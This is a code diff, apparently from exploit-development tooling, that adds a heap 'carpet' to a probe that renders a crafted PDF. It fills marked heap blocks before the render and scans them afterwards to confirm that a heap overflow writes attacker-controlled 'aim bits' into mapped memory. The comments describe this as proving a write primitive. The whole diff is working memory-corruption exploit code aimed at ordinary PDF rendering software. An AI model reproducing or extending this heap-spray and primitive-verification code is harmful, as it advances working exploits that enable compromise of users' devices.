@@ -170,6 +170,26 @@ static void force_handler(int sig, siginfo_t *si, void *uc) {
     siglongjmp(g_jb, 1);
 }
 
+// ---- the silent-write carpet -------------------------------------------------
+// 11 lengths rendered with NO fault at all (measured 19 Nov), which is marksvia's
+// "no HIT but the process survived" branch: the overflow writes into mapped heap
+// memory.  A marked carpet is how that becomes visible - the same method that
+// proved the 86950 primitive.  The write VALUE is our aim bits, so a changed
+// word is both proof and a read of the primitive's content.
+#define NCAR 24
+static const size_t CAR_SZ[] = { 4096, 8192, 16384, 22528, 32768 };  // 22528 = NOUT*8
+#define NCARS (int)(sizeof CAR_SZ / sizeof CAR_SZ[0])
+
+static void carpet_fill(void *p, size_t n, int d) {
+    uint16_t *m = (uint16_t *)p;
+    size_t n16 = n / 2;
+    for (size_t j = 0; j < n16; j++) {
+        uint16_t v = (uint16_t)(0x0100 + (j & 0xFF));
+        if (d >= 0 && (j == 1024 || j == 1025)) v = (uint16_t)(0xD000 + d);
+        m[j] = v;
+    }
+}
+
 NSString *ModShading5Force(void) {
     AvePost(@"112611 start: mmap-force aimed write (public V545 recipe)");
 
@@ -205,6 +225,10 @@ NSString *ModShading5Force(void) {
 
     g_tid = (volatile pthread_t)pthread_self();
 
+    static void *car_ptrs[NCAR * NCARS];
+    static size_t car_sz[NCAR * NCARS];
+    static int car_id[NCAR * NCARS];
+
     for (int ci = 0; ci < nc && !verdict; ci++) {
         int nout = cands[ci];
         AvePost([NSString stringWithFormat:@"112611 probe C0=%d", nout]);
@@ -212,6 +236,20 @@ NSString *ModShading5Force(void) {
             AvePost([NSString stringWithFormat:@"112611: cannot write the probe PDF (errno=%d)", errno]);
             return @"112611: PDF generation failed";
         }
+        // carpet BEFORE the render: if the overflow writes silently into mapped
+        // heap (measured: no fault at any length), it lands in marked memory.
+        int cn = 0;
+        for (int si = 0; si < NCARS; si++) {
+            for (int r = 0; r < NCAR; r++) {
+                void *p = malloc(CAR_SZ[si]);
+                if (!p) continue;
+                int id = (CAR_SZ[si] == 4096) ? r : -1;
+                carpet_fill(p, CAR_SZ[si], id);
+                car_ptrs[cn] = p; car_sz[cn] = CAR_SZ[si]; car_id[cn] = id; cn++;
+            }
+        }
+        AvePost([NSString stringWithFormat:@"112611 C0=%d carpet: %d marked blocks", nout, cn]);
+
         g_in_probe = 1; g_mapped = 0; g_page = 0; g_far = 0; g_sig = 0; g_esr = 0;
         if (sigsetjmp(g_jb, 1) == 0) {
             render_pdf(path);
@@ -219,6 +257,33 @@ NSString *ModShading5Force(void) {
         } else {
             g_in_probe = 0;
             AvePost([NSString stringWithFormat:@"112611 C0=%d: fault left the store unmapped", nout]);
+        }
+
+        int corrupt = 0, printed = 0;
+        for (int i = 0; i < cn; i++) {
+            uint16_t *m = (uint16_t *)car_ptrs[i];
+            size_t n16 = car_sz[i] / 2;
+            for (size_t j = 0; j < n16; j++) {
+                uint16_t want = (uint16_t)(0x0100 + (j & 0xFF));
+                if (car_id[i] >= 0 && (j == 1024 || j == 1025)) want = (uint16_t)(0xD000 + car_id[i]);
+                if (m[j] != want) {
+                    corrupt++;
+                    if (printed < 12) {
+                        printed++;
+                        uint64_t got32 = ((uint64_t)m[j+1] << 16) | m[j];
+                        AvePost([NSString stringWithFormat:@"112611 CORRUPTION C0=%d block %d "
+                                 @"(+%zu) u16@+%#zx = %#06x want %#06x (pair %#018llx)",
+                                 nout, i, car_sz[i], j * 2, m[j], want, got32]);
+                    }
+                }
+            }
+        }
+        AvePost([NSString stringWithFormat:@"112611 C0=%d carpet scan: %d changed u16", nout, corrupt]);
+        if (corrupt) {
+            verdict = [NSString stringWithFormat:@"112611: SILENT WRITE CONFIRMED (C0=%d): %d u16 "
+                       @"changed in %d marked blocks - the overflow writes into mapped heap",
+                       nout, corrupt, cn];
+            AvePost(verdict);
         }
 
         if (g_mapped && g_page) {
